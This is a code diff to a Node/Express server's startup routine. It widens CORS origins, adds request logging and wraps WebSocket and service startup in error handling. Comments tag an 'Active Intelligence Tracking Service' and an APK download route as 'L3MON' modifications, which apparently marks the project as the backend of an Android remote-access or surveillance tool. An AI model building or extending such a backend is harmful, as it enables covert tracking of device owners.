@@ -27,10 +27,13 @@ async function startServer() {
   // ✅ CORS CONFIGURADO PARA VERCEL
   const corsOptions = {
     origin: [
-      process.env.VITE_APP_URL || "http://192.168.200.9:5173",
+      process.env.VITE_APP_URL || "http://192.168.200.6:5173",
+      "http://192.168.200.9:5173",
       "http://localhost:5173",
+      "http://127.0.0.1:5173",
       "https://repodeploy.vercel.app"
     ],
+
     credentials: true,
     methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
     allowedHeaders: ["Content-Type", "Authorization", "X-TRPC-Source"]
@@ -39,9 +42,18 @@ async function startServer() {
   app.use(cors(corsOptions));
   app.use(cookieParser());
   
+  // Middleware de Rastreo para Depuración
+  app.use((req, res, next) => {
+    console.log(`[HTTP] ${req.method} ${req.url} | From: ${req.ip}`);
+    next();
+  });
+
+  
   // Health check for auto-discovery
   app.get("/api/health", async (req, res) => {
+    console.log(`[HTTP] Health Check from: ${req.ip} | User-Agent: ${req.get('user-agent')}`);
     try {
+
       const os = await import("os");
       const networkInterfaces = os.networkInterfaces();
       const localIp = Object.values(networkInterfaces)
@@ -59,12 +71,25 @@ async function startServer() {
   });
 
   // Initialize WebSocket server
-  const { initializeWebSocket } = await import("../websocket");
-  const wsManager = initializeWebSocket(server);
+  let wsManager: any = null;
+  try {
+    const { initializeWebSocket } = await import("../websocket");
+    wsManager = initializeWebSocket(server);
+    console.log("[Server] WebSocket initialized successfully");
+  } catch (wsError) {
+    console.error("[Server] Critical: Failed to initialize WebSocket:", wsError);
+  }
 
   // [MOD L3MON] Start Active Intelligence Tracking Service
-  const { activeTrackingService } = await import("../activeTrackingService");
-  activeTrackingService.start(wsManager);
+  try {
+    const { activeTrackingService } = await import("../activeTrackingService");
+    if (wsManager) {
+      activeTrackingService.start(wsManager);
+    }
+  } catch (trackingError) {
+    console.error("[Server] Warning: Failed to start ActiveTracking service:", trackingError);
+  }
+
 
   // [MOD L3MON] Register APK Download Route
   const { handleAPKDownload } = await import("../apkDownload");
